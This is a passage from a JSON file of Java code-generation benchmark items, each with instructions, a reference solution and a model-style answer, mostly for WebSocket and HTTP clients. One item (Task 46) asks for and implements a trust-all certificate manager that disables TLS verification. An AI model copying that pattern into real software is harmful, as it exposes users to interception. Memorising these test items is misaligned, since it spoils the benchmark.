switch (platform) {\n            case PlatformType.ANDROID -> handleAndroidOccupy(udId, jsonObject);\n            case PlatformType.IOS -> handleIOSOccupy(udId, jsonObject);\n        }\n\n        JSONObject jsonDebug = new JSONObject();\n        jsonDebug.put(\"msg\", \"debugUser\");\n        jsonDebug.put(\"token\", token);\n        jsonDebug.put(\"udId\", udId);\n        TransportWorker.send(jsonDebug);\n    }\n\n    private void handleAndroidOccupy(String udId, JSONObject jsonObject) {\n        log.info(\"android lock udId\uff1a{}\", udId);\n        AndroidDeviceLocalStatus.startDebug(udId);\n\n        IDevice iDevice = AndroidDeviceBridgeTool.getIDeviceByUdId(udId);\n        if (iDevice == null) {\n            log.info(\"Target device is not connecting, please check the connection.\");\n            return;\n        }\n\n        int sasPort = jsonObject.getInteger(\"sasRemotePort\");\n        int uiaPort = jsonObject.getInteger(\"uia2RemotePort\");\n\n        if (sasPort != 0) {\n            AndroidSupplyTool.startShare(udId, sasPort);\n        }\n\n        if (uiaPort != 0) {\n            try {\n                AndroidDeviceBridgeTool.startUiaServer(iDevice, uiaPort);\n            } catch (InstallException e) {\n                log.error(e.getMessage());\n            }\n        }\n\n        OccupyMap.map.put(udId,\n                ScheduleTool.schedule(() -> {\n                    log.info(\"time up!\");\n                    androidRelease(udId);\n                }, BytesTool.remoteTimeout));\n    }\n\n    private void handleIOSOccupy(String udId, JSONObject jsonObject) {\n        log.info(\"ios lock udId\uff1a{}\", udId);\n        IOSDeviceLocalStatus.startDebug(udId);\n\n        if (!SibTool.getDeviceList().contains(udId)) {\n            log.info(\"Target device is not connecting, please check the connection.\");\n            return;\n        }\n\n        int sibPort = jsonObject.getInteger(\"sibRemotePort\");\n        int wdaPort = jsonObject.getInteger(\"wdaServerRemotePort\");\n        int wdaMjpegPort = jsonObject.getInteger(\"wdaMjpegRemotePort\");\n\n        if (sibPort != 0) {\n            SibTool.startShare(udId, sibPort);\n        }\n\n        if (wdaPort != 0 || wdaMjpegPort != 0) {\n            try {\n                SibTool.startWda(udId, wdaPort, wdaMjpegPort);\n            } catch (IOException | InterruptedException e) {\n                log.error(e.getMessage());\n            }\n        }\n\n        OccupyMap.map.put(udId,\n                ScheduleTool.schedule(() -> {\n                    log.info(\"time up!\");\n                    iosRelease(udId);\n                }, BytesTool.remoteTimeout));\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 27,
    "right_result": "```java\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\nimport org.json.JSONObject;\nimport java.net.URI;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class TransportClient extends WebSocketClient {\n    private final ExecutorService threadPool = Executors.newCachedThreadPool();\n\n    public TransportClient(URI serverUri) {\n        super(serverUri);\n    }\n\n    @Override\n    public void onOpen(ServerHandshake serverHandshake) {\n        System.out.println(\"WebSocket connection established.\");\n    }\n\n    @Override\n    public void onMessage(String s) {\n        threadPool.execute(() -> {\n            try {\n                JSONObject jsonObject = new JSONObject(s);\n                String type = jsonObject.getString(\"type\");\n                switch (type) {\n                    case \"occupy\":\n                        handleOccupyMessage(jsonObject);\n                        break;\n                    // Additional cases for other message types can be added here\n                }\n            } catch (Exception e) {\n                onError(e);\n            }\n        });\n    }\n\n    @Override\n    public void onClose(int i, String s, boolean b) {\n        System.out.println(\"Connection closed: \" + s);\n        // Reconnection logic or cleanup code can be added here\n    }\n\n    @Override\n    public void onError(Exception e) {\n        System.err.println(\"Error occurred: \" + e.getMessage());\n        e.printStackTrace();\n    }\n\n    private void handleOccupyMessage(JSONObject jsonObject) {\n        String platform = jsonObject.getString(\"platform\");\n        String udId = jsonObject.getString(\"udId\");\n\n        if (\"android\".equalsIgnoreCase(platform)) {\n            handleAndroidOccupy(udId, jsonObject.getJSONObject(\"params\"));\n        } else if (\"ios\".equalsIgnoreCase(platform)) {\n            handleIOSOccupy(udId, jsonObject.getJSONObject(\"params\"));\n        } else {\n            System.err.println(\"Unsupported platform: \" + platform);\n        }\n    }\n\n    private void handleAndroidOccupy(String udId, JSONObject params) {\n        System.out.println(\"Occupying Android device: \" + udId);\n        // Start Android-specific debug session and services\n        // Example: startADBSession(udId, params);\n    }\n\n    private void handleIOSOccupy(String udId, JSONObject params) {\n        System.out.println(\"Occupying iOS device: \" + udId);\n        // Start iOS-specific debug session and services\n        // Example: startiOSDebugSession(udId, params);\n    }\n}\n```"
  },
  {
    "Task_id": 459,
    "Instruction": "Task Description: Create a WebSocket client class in Java using the org.java_websocket library to establish a connection to a WebSocket server and handle communication events.\n\nClass Description: The MyWebSocketClient class extends WebSocketClient to provide a custom WebSocket client implementation. It supports WebSocket communication with a server, including connection establishment, message exchange, and error handling. The class includes event handlers for WebSocket lifecycle events.\n\nAttributes:\n- perMessageDeflateDraft: [Draft] - A WebSocket draft implementation with Per-Message Deflate extension for message compression.\n\nMethods:\n- MyWebSocketClient: [Constructor](String serverUri) -> [void] - Initializes the WebSocket client with the server URI. Throws URISyntaxException if the URI is invalid.\n- onOpen: [void](ServerHandshake handshakedata) -> [void] - Callback invoked when the WebSocket connection is established.\n- onMessage: [void](String message) -> [void] - Callback invoked when a message is received from the server.\n- onClose: [void](int code, String reason, boolean remote) -> [void] - Callback invoked when the WebSocket connection is closed.\n- onError: [void](Exception ex) -> [void] - Callback invoked when an error occurs during WebSocket communication.",
    "Canonical_solution": "import java.net.URI;\nimport java.net.URISyntaxException;\nimport java.util.Collections;\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.drafts.Draft;\nimport org.java_websocket.drafts.Draft_6455;\nimport org.java_websocket.extensions.permessage_deflate.PerMessageDeflateExtension;\nimport org.java_websocket.handshake.ServerHandshake;\n\npublic class MyWebSocketClient extends WebSocketClient {\n\n    private static final Draft perMessageDeflateDraft = new Draft_6455(\n        new PerMessageDeflateExtension());\n\n    public MyWebSocketClient(String serverUri) throws URISyntaxException {\n        super(new URI(serverUri), perMessageDeflateDraft);\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n    }\n\n    @Override\n    public void onMessage(String message) {\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n    }\n\n    @Override\n    public void onError(Exception ex) {\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 27,
    "right_result": "```java\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\nimport org.java_websocket.drafts.Draft;\n\nimport java.net.URI;\nimport java.net.URISyntaxException;\n\npublic class MyWebSocketClient extends WebSocketClient {\n\n    private static final Draft perMessageDeflateDraft = new org.java_websocket.drafts.Draft_6455();\n\n    public MyWebSocketClient(String serverUri) throws URISyntaxException {\n        super(new URI(serverUri), perMessageDeflateDraft);\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        System.out.println(\"Connected to the server\");\n    }\n\n    @Override\n    public void onMessage(String message) {\n        System.out.println(\"Received: \" + message);\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        System.out.println(\"Connection closed by \" + (remote ? \"server\" : \"client\") + \". Code: \" + code + \", Reason: \" + reason);\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        System.err.println(\"Error occurred: \" + ex.getMessage());\n        ex.printStackTrace();\n    }\n}\n```"
  },
  {
    "Task_id": 46,
    "Instruction": "Task Description: Create a Java class for HTTP communication that supports both HTTP and HTTPS protocols, with methods for GET and POST requests, including SSL configuration for secure connections.\n\nClass Description: The HttpCommunicationClient class provides functionality for making HTTP/HTTPS requests with configurable SSL settings. It supports both synchronous GET and POST operations with customizable headers and request bodies.\n\nAttributes:\n- usesSSL: boolean - Indicates whether to use HTTPS (true) or HTTP (false)\n- sslContext: SSLContext - SSL context configuration for HTTPS connections\n- address: InetSocketAddress - The target server address (host and port)\n- uri: URI - Base URI constructed from the address and protocol\n- httpClient: HttpClient - The HTTP client instance for making requests\n- trustAll: TrustManager[] - Array of trust managers that accept all certificates (bypasses SSL verification)\n\nMethods:\n- HttpCommunicationClient(boolean useSSL) -> Constructor - Initializes the client with SSL configuration\n- initialize(InetSocketAddress address) -> void - Sets up the HTTP client with target address and creates base URI\n- get(String urlPath) -> HttpResponse<String> - Sends a GET request to the specified URL path and returns the response\n- post(String urlPath, String body, String[]... headers) -> HttpResponse<String> - Sends a POST request with body and headers to the specified URL path\n- post(String body, String[]... headers) -> HttpResponse<String> - Sends a POST request with body and headers to the base URI",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpClient.Redirect;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpRequest.BodyPublishers;\nimport java.net.http.HttpRequest.Builder;\nimport java.net.http.HttpResponse;\nimport java.net.http.HttpResponse.BodyHandlers;\nimport java.security.KeyManagementException;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.SecureRandom;\nimport java.security.cert.CertificateException;\nimport java.security.cert.X509Certificate;\nimport java.util.Locale;\n\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLEngine;\nimport javax.net.ssl.TrustManager;\nimport javax.net.ssl.X509ExtendedTrustManager;\n\npublic class HttpCommunicationClient {\n\n    private final boolean usesSSL;\n    private final SSLContext sslContext;\n    private InetSocketAddress address;\n    protected URI uri;\n    protected HttpClient httpClient;\n\n    private static TrustManager[] trustAll = new TrustManager[]{\n        new X509ExtendedTrustManager() {\n            public X509Certificate[] getAcceptedIssuers() {\n                return null;\n            }\n\n            public void checkClientTrusted(X509Certificate[] certs, String authType) {\n            }\n\n            public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {\n            }\n\n            @Override\n            public void checkClientTrusted(X509Certificate[] chain, String authType, Socket socket) throws CertificateException {\n            }\n\n            @Override\n            public void checkServerTrusted(X509Certificate[] chain, String authType, Socket socket) throws CertificateException {\n            }\n\n            @Override\n            public void checkClientTrusted(X509Certificate[] chain, String authType, SSLEngine engine) throws CertificateException {\n            }\n\n            @Override\n            public void checkServerTrusted(X509Certificate[] chain, String authType, SSLEngine engine) throws CertificateException {\n            }\n        }\n    };\n\n    public HttpCommunicationClient(boolean useSSL) {\n        try {\n            sslContext = SSLContext.getInstance(\"TLSv1.2\");\n            sslContext.init(null, trustAll, new SecureRandom());\n        } catch (KeyManagementException | NoSuchAlgorithmException e) {\n            throw new RuntimeException(e);\n        }\n        this.usesSSL = useSSL;\n    }\n\n    public void initialize(InetSocketAddress address) {\n        this.httpClient = HttpClient.newBuilder()\n            .followRedirects(Redirect.NORMAL)\n            .sslContext(sslContext)\n            .build();\n        this.address = address;\n        this.uri = URI.create(String.format(Locale.ENGLISH,\n            \"%s://%s:%s/_sql?error_trace\",\n            usesSSL ? \"https\" : \"http\", address.getHostName(), address.getPort()));\n    }\n\n    public HttpResponse<String> get(String urlPath) throws Exception {\n        assert urlPath != null : \"url cannot be null\";\n        URI uri = URI.create(String.format(Locale.ENGLISH,\n            \"%s://%s:%s/%s\", usesSSL ? \"https\" : \"http\", address.getHostName(), address.getPort(), urlPath));\n        HttpRequest request = HttpRequest.newBuilder(uri)\n            .build();\n        return httpClient.send(request, BodyHandlers.ofString());\n    }\n\n    public HttpResponse<String> post(String urlPath, String body, String[] ... headers) throws Exception {\n        assert urlPath != null : \"url cannot be null\";\n        URI uri = URI.create(String.format(Locale.ENGLISH,\n            \"%s://%s:%s/%s\", usesSSL ? \"https\" : \"http\", address.getHostName(), address.getPort(), urlPath));\n        HttpRequest request = HttpRequest.newBuilder(uri)\n            .POST(body == null ? BodyPublishers.noBody() : BodyPublishers.ofString(body))\n            .build();\n        return httpClient.send(request, BodyHandlers.ofString());\n    }\n\n    public HttpResponse<String> post(String body, String[] ... headers) throws Exception {\n        Builder builder = HttpRequest.newBuilder(uri)\n            .header(\"Content-Type\", \"application/json\");\n        if (body != null) {\n            builder.POST(BodyPublishers.ofString(body));\n        }\n        for (String[] header : headers) {\n            builder.headers(header[0], header[1]);\n        }\n        return httpClient.send(builder.build(), BodyHandlers.ofString());\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.security.KeyManagementException;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.SecureRandom;\nimport java.util.Map;\n\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.TrustManager;\nimport javax.net.ssl.X509TrustManager;\n\npublic class HttpCommunicationClient {\n    private boolean usesSSL;\n    private SSLContext sslContext;\n    private InetSocketAddress address;\n    private URI uri;\n    private HttpClient httpClient;\n    private TrustManager[] trustAll;\n\n    public HttpCommunicationClient(boolean useSSL) throws NoSuchAlgorithmException, KeyManagementException {\n        this.usesSSL = useSSL;\n        if (useSSL) {\n            sslContext = SSLContext.getInstance(\"TLS\");\n            sslContext.init(null, getTrustAllCerts(), new SecureRandom());\n            httpClient = HttpClient.newBuilder()\n                    .sslContext(sslContext)\n                    .build();\n        } else {\n            httpClient = HttpClient.newHttpClient();\n        }\n    }\n\n    public void initialize(InetSocketAddress address) throws Exception {\n        this.address = address;\n        String protocol = usesSSL ? \"https\" : \"http\";\n        String host = address.getHostString();\n        int port = address.getPort();\n        this.uri = new URI(protocol, null, host, port, null, null, null);\n    }\n\n    public HttpResponse<String> get(String urlPath) throws IOException, InterruptedException {\n        String fullUrl = uri.resolve(urlPath).toString();\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(URI.create(fullUrl))\n                .GET()\n                .build();\n        return httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n    }\n\n    public HttpResponse<String> post(String urlPath, String body, String[]... headers) throws IOException, InterruptedException {\n        String fullUrl = uri.resolve(urlPath).toString();\n        HttpRequest.Builder requestBuilder = HttpRequest.newBuilder()\n                .uri(URI.create(fullUrl))\n                .POST(HttpRequest.BodyPublishers.ofString(body));\n\n        for (String[] header : headers) {\n            if (header.length == 2) {\n                requestBuilder.header(header[0], header[1]);\n            }\n        }\n\n        HttpRequest request = requestBuilder.build();\n        return httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n    }\n\n    public HttpResponse<String> post(String body, String[]... headers) throws IOException, InterruptedException {\n        return post(\"\", body, headers);\n    }\n\n    private TrustManager[] getTrustAllCerts() {\n        if (trustAll != null) {\n            return trustAll;\n        }\n        trustAll = new TrustManager[]{\n                new X509TrustManager() {\n                    public void checkClientTrusted(java.security.cert.X509Certificate[] chain, String authType) {\n                    }\n\n                    public void checkServerTrusted(java.security.cert.X509Certificate[] chain, String authType) {\n                    }\n\n                    public java.security.cert.X509Certificate[] getAcceptedIssuers() {\n                        return new java.security.cert.X509Certificate[]{};\n                    }\n                }\n        };\n        return trustAll;\n    }\n}\n```"
  },
  {
    "Task_id": 460,
    "Instruction": "Task Description: Create a WebSocket client class in Java using the org.java_websocket library to establish a connection to a WebSocket server and handle communication events.\n\nClass Description: The SimpleClient class extends WebSocketClient to provide a basic WebSocket client implementation. It handles connection events, message reception, connection closure, and errors through callback methods.\n\nAttributes:\n- serverUri: URI - The URI of the WebSocket server to connect to (inherited from WebSocketClient)\n\nMethods:\n- SimpleClient(URI serverUri) -> None - Constructor that initializes the WebSocket client with the server URI.\n- onOpen(ServerHandshake handshakedata) -> void - Callback method invoked when the WebSocket connection is successfully opened.\n- onMessage(String message) -> void - Callback method invoked when a text message is received from the server.\n- onClose(int code, String reason, boolean remote) -> void - Callback method invoked when the WebSocket connection is closed.\n- onError(Exception ex) -> void - Callback method invoked when an error occurs in the WebSocket connection.",
    "Canonical_solution": "import java.net.URI;\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\n\npublic class SimpleClient extends WebSocketClient {\n\n    public SimpleClient(URI serverUri) {\n        super(serverUri);\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        // Handle connection opening\n    }\n\n    @Override\n    public void onMessage(String message) {\n        // Handle text message received\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        // Handle connection closing\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        // Handle errors\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 27,
    "right_result": "```java\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\n\nimport java.net.URI;\nimport java.net.URISyntaxException;\n\npublic class SimpleClient extends WebSocketClient {\n\n    public SimpleClient(URI serverUri) {\n        super(serverUri);\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        System.out.println(\"Connected to server\");\n    }\n\n    @Override\n    public void onMessage(String message) {\n        System.out.println(\"Received: \" + message);\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        System.out.println(\"Connection closed by \" + (remote ? \"server\" : \"client\") + \". Code: \" + code + \", Reason: \" + reason);\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        System.err.println(\"Error occurred: \" + ex.getMessage());\n        ex.printStackTrace();\n    }\n\n    public static void main(String[] args) {\n        try {\n            URI uri = new URI(\"ws://example.com/websocket\");\n            SimpleClient client = new SimpleClient(uri);\n            client.connect();\n        } catch (URISyntaxException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 461,
    "Instruction": "Task Description: Implement a WebSocket client class in Java using the org.java_websocket library to establish a connection with a WebSocket server, send and receive messages, and handle connection events.\n\nClass Description: The ExampleClient class extends WebSocketClient to create a WebSocket client that connects to a specified server URI. It overrides key WebSocket event-handling methods to manage connection lifecycle events.\n\nAttributes:\n- Inherited from WebSocketClient: All necessary attributes for WebSocket connection management are inherited from the parent class.\n\nMethods:\n- Constructor: ExampleClient(URI serverUri, Draft draft) -> void - Initializes the WebSocket client with server URI and protocol draft.\n- Constructor: ExampleClient(URI serverURI) -> void - Initializes the WebSocket client with server URI using default draft.\n- Constructor: ExampleClient(URI serverUri, Map<String, String> httpHeaders) -> void - Initializes the WebSocket client with server URI and custom HTTP headers.\n- onOpen: onOpen(ServerHandshake handshakedata) -> void - Called when connection is established, sends a greeting message.\n- onMessage: onMessage(String message) -> void - Called when a message is received from the server.\n- onClose: onClose(int code, String reason, boolean remote) -> void - Called when the connection is closed, logs closure details.\n- onError: onError(Exception ex) -> void - Called when an error occurs, prints the stack trace.",
    "Canonical_solution": "import java.net.URI;\nimport java.util.Map;\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.drafts.Draft;\nimport org.java_websocket.handshake.ServerHandshake;\n\npublic class ExampleClient extends WebSocketClient {\n\n  public ExampleClient(URI serverUri, Draft draft) {\n    super(serverUri, draft);\n  }\n\n  public ExampleClient(URI serverURI) {\n    super(serverURI);\n  }\n\n  public ExampleClient(URI serverUri, Map<String, String> httpHeaders) {\n    super(serverUri, httpHeaders);\n  }\n\n  @Override\n  public void onOpen(ServerHandshake handshakedata) {\n    send(\"Hello, it is me. Mario :)\");\n    System.out.println(\"opened connection\");\n  }\n\n  @Override\n  public void onMessage(String message) {\n    System.out.println(\"received: \" + message);\n  }\n\n  @Override\n  public void onClose(int code, String reason, boolean remote) {\n    System.out.println(\n        \"Connection closed by \" + (remote ? \"remote peer\" : \"us\") + \" Code: \" + code + \" Reason: \"\n            + reason);\n  }\n\n  @Override\n  public void onError(Exception ex) {\n    ex.printStackTrace();\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 27,
    "right_result": "```java\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\nimport java.net.URI;\nimport java.util.Map;\n\npublic class ExampleClient extends WebSocketClient {\n\n    public ExampleClient(URI serverUri, Draft draft) {\n        super(serverUri, draft);\n    }\n\n    public ExampleClient(URI serverURI) {\n        super(serverURI);\n    }\n\n    public ExampleClient(URI serverUri, Map<String, String> httpHeaders) {\n        super(serverUri, httpHeaders);\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        System.out.println(\"Connected to server\");\n        send(\"Hello Server!\");\n    }\n\n    @Override\n    public void onMessage(String message) {\n        System.out.println(\"Received: \" + message);\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        System.out.println(\"Connection closed by \" + (remote ? \"server\" : \"client\") + \", Code: \" + code + \", Reason: \" + reason);\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        ex.printStackTrace();\n    }\n}\n```"
  },
  {
    "Task_id": 462,
    "Instruction": "Task Description: Create a WebSocket client class that extends the basic WebSocketClient functionality to handle WebSocket communication with event callbacks and response streaming.\n\nClass Description: The MilkmanWebsocketClient class extends WebSocketClient to provide custom WebSocket client functionality. It handles WebSocket events (open, message, close, error) and streams responses to a subscriber while managing asynchronous request control.\n\nAttributes:\n- responseSubscriber: [Subscriber<byte[]>] - A subscriber that receives response data as byte arrays\n- asyncControl: [AsyncControl] - An asynchronous control object for managing request state and cancellation\n\nMethods:\n- MilkmanWebsocketClient([URI serverUri, Subscriber<byte[]> responseSubscriber, AsyncControl asyncControl]) -> [void] - Constructor that initializes the WebSocket client with server URI, response subscriber, and async control\n- onOpen([ServerHandshake handshakedata]) -> [void] - Callback when WebSocket connection is opened, triggers request ready\n- send([String message]) -> [void] - Sends a message through WebSocket and notifies subscriber of sent message\n- onMessage([String message]) -> [void] - Callback when message is received, notifies subscriber\n- onClose([int code, String reason, boolean remote]) -> [void] - Callback when WebSocket is closed, completes subscriber and marks request success\n- onError([Exception ex]) -> [void] - Callback when error occurs, notifies subscriber and marks request failure",
    "Canonical_solution": "import milkman.utils.AsyncResponseControl.AsyncControl;\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\nimport org.reactivestreams.Subscriber;\n\nimport java.net.URI;\n\npublic class MilkmanWebsocketClient extends WebSocketClient {\n\n    private final Subscriber<byte[]> responseSubscriber;\n    private final AsyncControl asyncControl;\n\n    public MilkmanWebsocketClient(URI serverUri,\n                                Subscriber<byte[]> responseSubscriber,\n                                AsyncControl asyncControl) {\n        super(serverUri);\n        this.responseSubscriber = responseSubscriber;\n        this.asyncControl = asyncControl;\n        asyncControl.onCancellationRequested.add(() -> close());\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        asyncControl.triggerReqeuestReady();\n    }\n\n    @Override\n    public void send(String message) {\n        String msg = \"SENT: \\n\" + message + \"\\n\\n\";\n        responseSubscriber.onNext(msg.getBytes());\n        super.send(message);\n    }\n\n    @Override\n    public void onMessage(String message) {\n        String msg = \"RECEIVED: \\n\" + message + \"\\n\\n\";\n        responseSubscriber.onNext(msg.getBytes());\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        responseSubscriber.onComplete();\n        asyncControl.triggerRequestSucceeded();\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        responseSubscriber.onError(ex);\n        asyncControl.triggerRequestFailed(ex);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 27,
    "right_result": "```java\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\n\npublic class MilkmanWebsocketClient extends WebSocketClient {\n    private final Subscriber<byte[]> responseSubscriber;\n    private final AsyncControl asyncControl;\n\n    public MilkmanWebsocketClient(URI serverUri, Subscriber<byte[]> responseSubscriber, AsyncControl asyncControl) {\n        super(serverUri);\n        this.responseSubscriber = responseSubscriber;\n        this.asyncControl = asyncControl;\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        responseSubscriber.onNext(\"WebSocket connection opened\".getBytes());\n        asyncControl.setRequestReady(true);\n    }\n\n    @Override\n    public void send(String message) {\n        super.send(message);\n        responseSubscriber.onNext((\"Sent: \" + message).getBytes());\n    }\n\n    @Override\n    public void onMessage(String message) {\n        responseSubscriber.onNext((\"Received: \" + message).getBytes());\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        responseSubscriber.onComplete();\n        asyncControl.setRequestSuccess(true);\n        responseSubscriber.onNext((\"Connection closed: \" + reason).getBytes());\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        responseSubscriber.onError(ex);\n        asyncControl.setRequestSuccess(false);\n        responseSubscriber.onNext((\"Error occurred: \" + ex.getMessage()).getBytes());\n    }\n}\n```"
  },
  {
    "Task_id": 463,
    "Instruction": "Task Description: Implement a WebSocket client class in Java using the org.java_websocket library to establish a connection with a WebSocket server, handle incoming messages, and manage connection events.\n\nClass Description: WebSocketChatClient is a class that extends WebSocketClient from the org.java_websocket library. It provides functionality to connect to a WebSocket server and handle various WebSocket events such as connection opening, message reception, connection closing, and errors.\n\nAttributes:\n- Inherited from WebSocketClient: All attributes from the parent class WebSocketClient are available but not explicitly defined here.\n\nMethods:\n- Constructor: WebSocketChatClient(URI serverUri) -> void - Initializes the WebSocket client with the server URI.\n- onOpen: onOpen(ServerHandshake handshakedata) -> void - Called when the WebSocket connection is established. Prints \"Connected\" to the console.\n- onMessage: onMessage(String message) -> void - Called when a message is received from the server. Prints the message to the console.\n- onClose: onClose(int code, String reason, boolean remote) -> void - Called when the WebSocket connection is closed. Prints \"Disconnected\" to the console.\n- onError: onError(Exception ex) -> void - Called when an error occurs. Prints the stack trace of the exception.",
    "Canonical_solution": "import java.net.URI;\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\n\nclass WebSocketChatClient extends WebSocketClient {\n\n  public WebSocketChatClient(URI serverUri) {\n    super(serverUri);\n  }\n\n  @Override\n  public void onOpen(ServerHandshake handshakedata) {\n    System.out.println(\"Connected\");\n  }\n\n  @Override\n  public void onMessage(String message) {\n    System.out.println(\"got: \" + message);\n  }\n\n  @Override\n  public void onClose(int code, String reason, boolean remote) {\n    System.out.println(\"Disconnected\");\n  }\n\n  @Override\n  public void onError(Exception ex) {\n    ex.printStackTrace();\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 27,
    "right_result": "```java\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\n\nimport java.net.URI;\nimport java.net.URISyntaxException;\n\npublic class WebSocketChatClient extends WebSocketClient {\n\n    public WebSocketChatClient(URI serverUri) {\n        super(serverUri);\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        System.out.println(\"Connected\");\n    }\n\n    @Override\n    public void onMessage(String message) {\n        System.out.println(message);\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        System.out.println(\"Disconnected\");\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        ex.printStackTrace();\n    }\n\n    public static void main(String[] args) {\n        try {\n            WebSocketChatClient client = new WebSocketChatClient(new URI(\"ws://example.com/websocket\"));\n            client.connect();\n        } catch (URISyntaxException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 464,
    "Instruction": "Task Description: Implement a WebSocket client class that handles secure WebSocket connections with custom SSL configuration and event delegation.\n\nClass Description: WebSocketTransport is a WebSocket client implementation that extends the WebSocketClient class from the org.java_websocket library. It manages WebSocket connections with optional SSL/TLS encryption and delegates connection events to a listener interface. The class handles connection establishment, message reception, and connection termination events.\n\nAttributes:\n- CONNECT_TIMEOUT: int - Static constant defining the connection timeout in milliseconds (5000ms)\n- webSocketListener: WebSocketListener - Interface reference for handling WebSocket events (open, message, close, error)\n\nMethods:\n- WebSocketTransport(String serverUri, HttpConfiguration.SSLProperties sslProperties, Map<String, String> headers, WebSocketListener webSocketListener) -> None - Constructor that initializes the WebSocket client with server URI, SSL properties, custom headers, and event listener. Throws URISyntaxException for invalid URIs.\n- onOpen(ServerHandshake serverHandshake) -> void - Callback when WebSocket connection is established. Delegates to webSocketListener.\n- onMessage(String s) -> void - Callback when a text message is received. Delegates to webSocketListener.\n- onClose(int code, String reason, boolean remote) -> void - Callback when connection is closed. Delegates to webSocketListener.\n- onError(Exception e) -> void - Callback when an error occurs. Delegates to webSocketListener.",
    "Canonical_solution": "import java.net.URI;\nimport java.net.URISyntaxException;\nimport java.util.Map;\n\nimport javax.net.ssl.SSLSocketFactory;\n\nimport org.apache.servicecomb.foundation.ssl.SSLManager;\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.drafts.Draft_6455;\nimport org.java_websocket.handshake.ServerHandshake;\n\npublic class WebSocketTransport extends WebSocketClient {\n  public static final int CONNECT_TIMEOUT = 5000;\n\n  private final WebSocketListener webSocketListener;\n\n  public WebSocketTransport(String serverUri, HttpConfiguration.SSLProperties sslProperties,\n      Map<String, String> headers, WebSocketListener webSocketListener)\n      throws URISyntaxException {\n    super(new URI(serverUri), new Draft_6455(), headers, CONNECT_TIMEOUT);\n\n    if (sslProperties.isEnabled()) {\n      SSLSocketFactory sslSocketFactory = SSLManager\n          .createSSLSocketFactory(sslProperties.getSslOption(), sslProperties.getSslCustom());\n      URI uri = new URI(serverUri);\n      setSocketFactory(new SSLSocketFactoryExt(sslSocketFactory, uri.getHost(), uri.getPort()));\n    }\n\n    this.webSocketListener = webSocketListener;\n  }\n\n  @Override\n  public void onOpen(ServerHandshake serverHandshake) {\n    this.webSocketListener.onOpen(serverHandshake);\n  }\n\n  @Override\n  public void onMessage(String s) {\n    this.webSocketListener.onMessage(s);\n  }\n\n  @Override\n  public void onClose(int code, String reason, boolean remote) {\n    this.webSocketListener.onClose(code, reason, remote);\n  }\n\n  @Override\n  public void onError(Exception e) {\n    this.webSocketListener.onError(e);\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 27,
